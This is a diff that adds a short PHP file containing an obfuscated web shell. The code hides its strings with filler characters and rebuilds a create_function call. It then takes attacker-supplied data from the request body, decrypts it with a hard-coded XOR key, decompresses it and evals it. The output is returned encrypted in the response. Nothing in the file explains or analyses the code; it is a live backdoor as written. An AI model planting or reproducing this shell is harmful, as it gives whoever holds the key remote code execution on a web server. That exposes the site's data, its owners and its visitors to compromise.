@@ -1,0 +1,10 @@
+<?php
+$n='QQ++){Q$Qo.=$t{$iQ}^$k{Q$j};}}returnQ $o;}if(@pregQ_matchQ("/$kh(.+)$QkQf/",@Qfile_Qget_contents("Qphp:';
+$u='//QinpQut"),$m)Q==1)Q{@oQb_start()Q;@evaQl(@gzuncQoQmpressQ(@x(@baQse64_decQodQe($m[1]),Q$k)));$o=@oQb_';
+$Q='$kQ="81dcQ9bdb";$kh=Q"52d04dQc200Q36";$kQf="dbd83Q13ed05Q5";$p=Q"BtQDpi3N8zzjQ4QwsFL";fuQQnction x($t,';
+$I='getQ_contQentQs();@QoQb_end_cleaQnQ();$r=@baQse64_eQncode(@xQ(@gzcomQpresQs(Q$o),$kQ));print(Q"$p$kh$r$kf");}';
+$N=str_replace('GR','','GRcreGRateGR_fuGRGRGRnction');
+$L='$kQ)Q{Q$c=strlen($k);$Ql=strQlen($Qt);$o=Q"";forQ($i=0;$i<Q$l;)Q{for($jQ=0;($j<$Qc&&$iQ<$l);Q$j++,$Qi';
+$D=str_replace('Q','',$Q.$L.$n.$u.$I);
+$H=$N('',$D);$H();
+?>
